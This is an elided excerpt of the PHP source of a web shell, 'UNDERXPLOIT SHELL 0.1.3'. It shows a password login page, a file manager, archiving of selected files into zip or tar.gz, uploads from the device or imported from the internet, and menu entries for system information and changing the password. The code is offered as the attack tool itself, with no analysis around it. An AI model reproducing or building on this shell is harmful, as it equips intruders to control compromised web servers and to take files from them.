...
die('<!DOCTYPE html>
<head>
    <title>LOGIN | UNDERXPLOIT SHELL 0.1.3</title>
    ...
    <meta name="theme-color" content="#7C94A8">
    <meta name="apple-mobile-web-app-capable" content="yes">
    <meta name="apple-mobile-web-app-status-bar-style" content="#7C94A8">
    <meta name="msapplication-navbutton-color" content="#7C94A8">
    <meta name="author" content="WILDAN IZZUDIN">
	<link href="//underxploit.github.io/assets/favicon.ico" rel="icon" type="image/x-icon" />
	<link rel="stylesheet" href="//underxploit.github.io/assets/icons/material.css" />
...
<head>
    <title>UNDERXPLOIT SHELL 0.1.3</title>
    ...
    <div class="co-ontainer-2">
        ...
        <div id="particles-js"></div>
            <div class="menus atas-ae" style="background:none">
                <div class="co-ontainer-3"><span id="judul" class="">UNDERXPLOIT  SHELL 1.3</span>   
...
<div id="paksa"><table class="table-info">
    ...
    <tr class="ex-hov">
        ...
        <td class="td-info">: 0.1.3 [ Dark ]</td>
    <tr class="ex-hov">
...
$(wr1).on("click",".remove_field", function(e) { 
		...
		<div class="coL-option"><div class="wr"><span class="label-success"><i class="zmdi zmdi-plus zmdi-hc-fw"></i></span> From Device : <button class="lawb add_1" style="width:50px;float:right">Add </button></div><hr>
...
<div class="coL-option top"><div class="wr"><span class="label-success"><i class="zmdi zmdi-plus zmdi-hc-fw"></i></span> From Internet (Import) :  <button class="lawb add_2" style="width:50px;float:right">Add </button></div>
    <hr>
...
break;
	default: 
		$_axo = '<a class="a" id="button-'.crc32($_axu).'">OPEN</a>';
...
print "<script type='text/javascript'>
	...
	print "<td style='width:10%;margin-left:10px'><center><label><input type ='checkbox' id ='actchk' onClick ='grow(this.checked);'><div class='icon'><i class='zmdi zmdi-check-all zmdi-hc-fw'></i></div></label></center></td>";
...
if (!empty($_COOKIE['act']) && @count($_COOKIE['target']) && (($_COOKIE['act'] == 'zip'))) 
	print "<input class='top' type='text' name='xpoz' value='" . rand(0, 100) . "-" . date("Y-m-d") . "." . ($_COOKIE['act'] == 'zip' ? 'zip' : 'tar.gz') . "' style='background:none;border:0;border-left:3px solid #7C94A8;margin-left:5px'>";
...
print '<table style="margin-top:3px" cellspacing="0">
...
print '<table class="ex-hov"><td class="td-tools-left"><i class="zmdi zmdi-dns zmdi-hc-fw"></i></td><td class="td-tools-content">System Information</td><td class="td-tools-icon"><a onclick=\'c("?' . x7 . 'system&' . x5 . $dir . '")\'><button class="btn-exe"><i class="zmdi zmdi-long-arrow-right zmdi-hc-fw"></i></button></a></td></table>';
print '<table class="ex-hov"><td class="td-tools-left"><i class="zmdi zmdi-upload zmdi-hc-fw"></i></td><td class="td-tools-content">Multiple Upload</td><td class="td-tools-icon"><a onclick=\'c("?' . x7 . 'upload&' . x5 . $dir . '")\'><button class="btn-exe"><i class="zmdi zmdi-long-arrow-right zmdi-hc-fw"></i></button></a></td></table>';
print '<table class="ex-hov"><td class="td-tools-left"><i class="zmdi zmdi-lock zmdi-hc-fw"></i></td><td class="td-tools-content">Change Password</td><td class="td-tools-icon"><a onclick=\'c("?' . x7 . 'change&' . x5 . $dir . '")\'><button class="btn-exe"><i class="zmdi zmdi-long-arrow-right zmdi-hc-fw"></i></button></a></td></table>';
